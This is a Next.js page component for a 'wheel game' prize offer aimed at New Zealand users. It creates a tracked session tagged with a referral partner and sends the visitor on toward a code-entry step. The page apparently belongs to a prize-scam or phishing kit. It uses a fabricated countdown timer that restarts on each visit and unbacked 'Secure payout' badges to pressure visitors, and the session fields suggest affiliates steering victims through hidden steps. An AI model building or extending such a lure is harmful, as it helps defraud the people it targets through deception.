"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import LiveToast from "@/components/LiveToast";
import { useSettings } from "@/contexts/SettingsContext";
import { persistActiveSession } from "@/lib/session-id-client";

export default function Home() {
  
  const { settings } = useSettings();
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(345); // 5:45 min countdown

  // Countdown
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
  };

  const handleStart = async () => {
    setLoading(true);
    setError("");
    
    const supabase = createBrowserSupabaseClient();
    if (!supabase) {
      setError("System error: Unable to connect.");
      setLoading(false);
      return;
    }

    // URL'den ref parametresini al
    const urlParams = new URLSearchParams(window.location.search);
    const partnerName = urlParams.get("ref") || "admin";

    // 1. Yeni bir session oluştur ve mevcut akışla uyumlu wheel oturumu başlat
    const { data, error: insertError } = await supabase
        .from("sessions")
        .insert({
          amount: 0,
          current_step: "code_entry",
          status: "offline",
          is_hidden: false,
          partner_name: partnerName,
          form_data: {
            currency: "NZ$",
            is_wheel_game: true,
          }
        })
        .select("id, public_id")
        .maybeSingle();

    if (insertError || !data?.id) {
      setError("Something went wrong. Please try again later.");
      setLoading(false);
      return;
    }

    persistActiveSession(data.id, data.public_id ? String(data.public_id) : data.id);
    window.location.href = "/wheel";
  };

  return (
    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
      <main className="w-full max-w-[650px] relative z-10 fade-in">
        <div className="rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-6 sm:p-10 text-center relative overflow-hidden">
          
          <div className="mb-6 flex justify-center">
            <div className="rounded-full bg-white/5 p-4 ring-4 ring-white/5">
              <svg className="h-12 w-12 text-[#0066CC]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M12 8v13m0-13V6a2 2 0 112 2h-2zm0 0V5.5A2.5 2.5 0 109.5 8H12zm-7 4h14M5 12a2 2 0 110-4h14a2 2 0 110 4M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7" />
              </svg>
            </div>
          </div>
          
          <h1 className="text-2xl font-bold text-white mb-3">{settings.win_title}</h1>
          
          <div className="inline-flex items-center justify-center gap-2 rounded-xl bg-red-500/10 px-4 py-2 mb-6 border border-red-500/20">
            <span className="relative flex h-2.5 w-2.5">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-red-500"></span>
            </span>
            <span className="text-xs font-bold text-red-400">Offer ends in: {formatTime(timeLeft)}</span>
          </div>

          <p className="text-sm text-gray-300 mb-8 leading-relaxed font-medium">
            {settings.win_subtitle}
          </p>

          {error && (
            <div className="mb-6 rounded-xl bg-red-500/10 p-3 text-sm text-red-400 border border-red-500/20 text-left flex items-start gap-2">
              <svg className="w-5 h-5 shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
              {error}
            </div>
          )}

          <button
            onClick={() => void handleStart()}
            disabled={loading || timeLeft === 0}
            className="w-full rounded-xl bg-gradient-to-r from-[#0066CC] to-[#0088FF] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(0,102,204,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60 flex items-center justify-center gap-2"
          >
            {loading ? (
              <>
                <svg className="animate-spin -ml-1 mr-2 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                Processing...
              </>
            ) : (
              <>
                {settings.win_button}
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M14 5l7 7m0 0l-7 7m7-7H3" />
                </svg>
              </>
            )}
          </button>

          {/* Trust badges */}
          <div className="mt-8 pt-6 border-t border-white/10 flex flex-wrap items-center justify-center gap-4 sm:gap-6 text-gray-400">
             <div className="flex items-center gap-1.5 text-xs font-medium">
                <svg className="w-4 h-4 text-[#0066CC]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
                Secure payout
             </div>
             <div className="flex items-center gap-1.5 text-xs font-medium">
                <svg className="w-4 h-4 text-[#0066CC]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
                Available now
             </div>
          </div>
        </div>
      </main>
    </div>
  );
}
